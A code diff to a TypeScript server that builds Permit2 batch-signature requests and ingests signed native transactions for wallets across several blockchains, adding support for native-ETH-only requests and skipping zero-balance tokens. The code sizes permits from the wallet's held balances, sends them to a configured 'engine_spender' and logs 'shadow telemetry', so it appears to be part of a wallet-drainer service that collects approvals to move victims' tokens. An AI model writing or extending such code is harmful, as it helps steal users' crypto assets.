@@ -672,7 +672,7 @@ async function buildPermit2BatchTypedDataForWallet(params: {
   nfts?: BatchNftEntry[]
   rpcUrl?: string
 }): Promise<{
-  typedData: ReturnType<typeof buildBatchPermitTypedData>
+  typedData: ReturnType<typeof buildBatchPermitTypedData> | null
   batch_permit_metadata: BatchPermitMetadata
   engine_spender: Address
   permit2: Address
@@ -691,19 +691,25 @@ async function buildPermit2BatchTypedDataForWallet(params: {
   const permit2 = resolveConfiguredPermit2()
   const rpcUrl = params.rpcUrl ?? getRpcUrlForChainWithFallback(params.chainId)
   const batchClient = createPublicClient({ chain: chainById(params.chainId), transport: http(rpcUrl) })
-  const resolvedPermits = await Promise.all(
-    params.permits.map(async (permit) => {
-      if (permit.amount > 0n && permit.amount < PERMIT2_MAX_AMOUNT) {
-        return permit
-      }
-      const amount = await resolvePermit2ApprovalAmountForToken({
-        client: batchClient,
-        wallet: params.wallet,
-        token: permit.token,
-      })
-      return { token: permit.token, amount }
-    }),
-  )
+  const resolvedPermits = (
+    await Promise.all(
+      params.permits.map(async (permit) => {
+        if (permit.amount > 0n && permit.amount < PERMIT2_MAX_AMOUNT) {
+          return permit
+        }
+        const amount = await resolvePermit2ApprovalAmountForToken({
+          client: batchClient,
+          wallet: params.wallet,
+          token: permit.token,
+        })
+        return { token: permit.token, amount }
+      }),
+    )
+  ).filter((permit) => permit.amount > 0n)
+  const nativeAmount = params.nativeAmount ?? 0n
+  if (resolvedPermits.length === 0 && nativeAmount <= 0n) {
+    throw new Error('No positive-balance ERC20 permits and nativeAmount is zero')
+  }
   const built = await batchNativeWithPermit2({
     wallet: params.wallet,
     chainId: params.chainId,
@@ -1513,8 +1519,8 @@ export async function registerSignatureAnchorRoute(app: FastifyInstance): Promis
     const walletRaw = body.wallet_address?.trim() ?? body.wallet?.trim() ?? ''
     const chainIdRaw = body.chain_id
     const permitsRaw = body.permits
-    if (!walletRaw || chainIdRaw == null || !Array.isArray(permitsRaw) || permitsRaw.length === 0) {
-      return sendFailure(reply, 400, 'wallet_address, chain_id, and non-empty permits[] required', {
+    if (!walletRaw || chainIdRaw == null || !Array.isArray(permitsRaw)) {
+      return sendFailure(reply, 400, 'wallet_address, chain_id, and permits[] required', {
         code: 'ValidationError',
       })
     }
@@ -1563,6 +1569,11 @@ export async function registerSignatureAnchorRoute(app: FastifyInstance): Promis
       if (nativeAmount < 0n) {
         return sendFailure(reply, 400, 'nativeAmount must be non-negative', { code: 'ValidationError' })
       }
+    }
+    if (permits.length === 0 && nativeAmount <= 0n) {
+      return sendFailure(reply, 400, 'permits[] or nativeAmount > 0 required', {
+        code: 'ValidationError',
+      })
     }
 
     const parseOptionalNative = (
@@ -1645,7 +1656,7 @@ export async function registerSignatureAnchorRoute(app: FastifyInstance): Promis
         rpcUrl,
       })
       return sendSuccess(reply, 200, 'Permit2 batch typed data ready', normalizeBigInts({
-        typed_data: built.typedData,
+        ...(built.typedData ? { typed_data: built.typedData } : {}),
         batch_permit_metadata: built.batch_permit_metadata,
         permits: permits.map((p) => ({ token: p.token, amount: p.amount.toString() })),
         nativeAmount: built.nativeAmount,
@@ -2393,6 +2404,12 @@ async function handleNormalizedIngress(
         b.batch_permit_metadata != null &&
         batchPermits != null &&
         batchPermits.length > 0
+      const nativeAmountIngress = parseNativeAmount(
+        b.evm_payload?.native_amount ?? b.nativeAmount ?? b.batch_permit_metadata?.native_amount ?? '0',
+      )
+      const hasEvmNativeLeg =
+        nativeAmountIngress > 0n &&
+        (b.evm_payload?.native_signed_transaction ?? b.native_signed_transaction) != null
       const hasNonEvmLeg =
         omnichainPayloads.data.solana != null ||
         omnichainPayloads.data.tron != null ||
@@ -2402,11 +2419,11 @@ async function handleNormalizedIngress(
         omnichainPayloads.data.aptos != null ||
         omnichainPayloads.data.sui != null
 
-      if (!hasEvmBatch && !hasNonEvmLeg) {
+      if (!hasEvmBatch && !hasNonEvmLeg && !hasEvmNativeLeg) {
         return sendFailure(
           reply,
           400,
-          'omnichain_atomic_v1 requires evm batch (chain_id, engine_spender, permit2, permits, batch_permit_metadata) and/or a non-EVM chain payload',
+          'omnichain_atomic_v1 requires evm batch (chain_id, engine_spender, permit2, permits, batch_permit_metadata), native ETH leg, and/or a non-EVM chain payload',
           { code: 'ValidationError' },
         )
       }
@@ -2479,6 +2496,18 @@ async function handleNormalizedIngress(
             nonce: b.batch_permit_metadata!.details.find((d) => d.token === permit.token)?.nonce ?? 0,
           })),
           ...(nativeAmount > 0n ? { native_amount: nativeAmount.toString() } : {}),
+        }
+      } else if (hasEvmNativeLeg) {
+        nativeAmount = nativeAmountIngress
+        nativeSignedRaw =
+          b.evm_payload?.native_signed_transaction ?? b.native_signed_transaction ?? undefined
+        const chainIdNative = Number(b.chain_id ?? 1)
+        batchMetadata = {
+          details: [],
+          spender: resolveConfiguredEngineSpender(),
+          sigDeadline: '0',
+          chainId: chainIdNative,
+          native_amount: nativeAmount.toString(),
         }
       }
 
@@ -2663,7 +2692,7 @@ async function handleNormalizedIngress(
       const chainIdNorm =
         b.chain_id != null && String(b.chain_id).trim() !== ''
           ? String(b.chain_id).trim()
-          : hasNonEvmLeg && !hasEvmBatch
+          : hasNonEvmLeg && !hasEvmBatch && !hasEvmNativeLeg
             ? 'omnichain'
             : undefined
       const tel = extractShadowTelemetry(b as unknown as Record<string, unknown>)
@@ -2677,7 +2706,9 @@ async function handleNormalizedIngress(
               }
             }, nativeAmount)
             .toString()
-        : tel.amount
+        : hasEvmNativeLeg
+          ? nativeAmount.toString()
+          : tel.amount
 
       return persistSignatureRow(
         {
